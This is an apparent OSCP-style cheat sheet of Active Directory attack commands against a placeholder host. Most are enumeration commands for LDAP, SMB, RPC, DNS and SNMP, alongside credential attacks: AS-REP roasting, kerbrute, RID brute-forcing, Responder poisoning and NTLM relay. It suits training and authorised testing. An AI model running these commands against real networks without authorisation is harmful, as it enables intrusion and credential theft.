```
# Nmap LDAP Enumeration
nmap -Pn -p389,636,3268,3269 -sV 10.10.10.10
nmap -Pn -p389 --script ldap-rootdse 10.10.10.10
nmap -Pn -p389 --script ldap-search 10.10.10.10
nmap -Pn -p445 --script smb-os-discovery 10.10.10.10
nmap -Pn -p445 --script smb-enum-shares 10.10.10.10
nmap -Pn -p445 --script smb-enum-users 10.10.10.10
nmap -Pn -p88 --script krb5-enum-users --script-args krb5-enum-users.realm=DOMAIN.LOCAL,userdb=users.txt 10.10.10.10

# SMB Null Session Enumeration
smbclient -L //10.10.10.10 -N
smbclient //10.10.10.10/IPC$ -N

# SMBMap Anonymous Enumeration
smbmap -H 10.10.10.10
smbmap -H 10.10.10.10 -u anonymous -p ''
smbmap -H 10.10.10.10 -u '' -p ''

# rpcclient Null Session
rpcclient -U "" -N 10.10.10.10
rpcclient -U "" 10.10.10.10

# rpcclient Enumeration
enumdomusers
enumdomgroups
enumalsgroups builtin
enumprivs
lsaquery
querydominfo
getdompwinfo
srvinfo
netshareenum
lookupnames administrator
lookupnames guest
queryuser RID
querygroup RID

# enum4linux-ng
enum4linux-ng -A 10.10.10.10
enum4linux-ng -U 10.10.10.10
enum4linux-ng -G 10.10.10.10
enum4linux-ng -S 10.10.10.10
enum4linux-ng -P 10.10.10.10

# enum4linux
enum4linux -a 10.10.10.10
enum4linux -U 10.10.10.10
enum4linux -S 10.10.10.10
enum4linux -P 10.10.10.10

# LDAP Anonymous Bind
ldapsearch -x -H ldap://10.10.10.10
ldapsearch -x -H ldap://10.10.10.10 -s base namingcontexts
ldapsearch -x -H ldap://10.10.10.10 -b "dc=domain,dc=local"
ldapsearch -x -H ldap://10.10.10.10 -b "dc=domain,dc=local" "(objectClass=user)"
ldapsearch -x -H ldap://10.10.10.10 -b "dc=domain,dc=local" "(objectClass=group)"
ldapsearch -x -H ldap://10.10.10.10 -b "dc=domain,dc=local" "(servicePrincipalName=*)"
ldapsearch -x -H ldap://10.10.10.10 -b "dc=domain,dc=local" "(description=*)"

# Kerberos User Enumeration
kerbrute userenum --dc 10.10.10.10 -d domain.local users.txt
kerbrute userenum --dc dc01.domain.local -d domain.local users.txt
kerbrute userenum --dc 10.10.10.10 -d domain.local users.txt -o valid_users.txt

# ASREP Roasting
GetNPUsers.py domain.local/ -dc-ip 10.10.10.10 -usersfile users.txt
GetNPUsers.py domain.local/ -dc-ip 10.10.10.10 -usersfile users.txt -format hashcat
GetNPUsers.py domain.local/ -dc-ip 10.10.10.10 -usersfile users.txt -outputfile asrep.txt

# RID Bruteforce
lookupsid.py anonymous@10.10.10.10
lookupsid.py guest@10.10.10.10
nxc smb 10.10.10.10 --rid-brute
crackmapexec smb 10.10.10.10 --rid-brute

# SMB Signing Check
nxc smb 10.10.10.10
crackmapexec smb 10.10.10.10
smbmap -H 10.10.10.10 --signing

# Responder
responder -I eth0
responder -I tun0 -dwv

# NTLM Relay Preparation
ntlmrelayx.py -tf targets.txt -smb2support

# DNS Enumeration
nslookup domain.local 10.10.10.10
dig axfr domain.local @10.10.10.10
host -t srv _ldap._tcp.domain.local
host -t srv _kerberos._tcp.domain.local

# SMB Share Spidering
smbmap -H 10.10.10.10 -R
smbclient //10.10.10.10/share -N -c 'recurse;prompt OFF;ls'

# BloodHound Python Collection
bloodhound-python -u '' -p '' -ns 10.10.10.10 -d domain.local -c All
bloodhound-python -u guest -p '' -ns 10.10.10.10 -d domain.local -c All

# NetExec Anonymous Enumeration
nxc smb 10.10.10.10
nxc smb 10.10.10.10 -u '' -p ''
nxc smb 10.10.10.10 --shares
nxc smb 10.10.10.10 --users
nxc smb 10.10.10.10 --groups
nxc smb 10.10.10.10 --sessions
nxc smb 10.10.10.10 --pass-pol

# SNMP Enumeration
snmpwalk -v2c -c public 10.10.10.10
snmpwalk -v1 -c public 10.10.10.10
onesixtyone -c community.txt 10.10.10.10

# Web Enumeration
whatweb http://10.10.10.10
nikto -h http://10.10.10.10
ffuf -u http://10.10.10.10/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt

# Common OSCP Commands
smbclient -L //10.10.10.10 -N
rpcclient -U "" -N 10.10.10.10
enum4linux-ng -A 10.10.10.10
ldapsearch -x -H ldap://10.10.10.10 -s base namingcontexts
kerbrute userenum --dc 10.10.10.10 -d domain.local users.txt
GetNPUsers.py domain.local/ -dc-ip 10.10.10.10 -usersfile users.txt
lookupsid.py anonymous@10.10.10.10
nxc smb 10.10.10.10 --rid-brute
responder -I tun0 -dwv

```
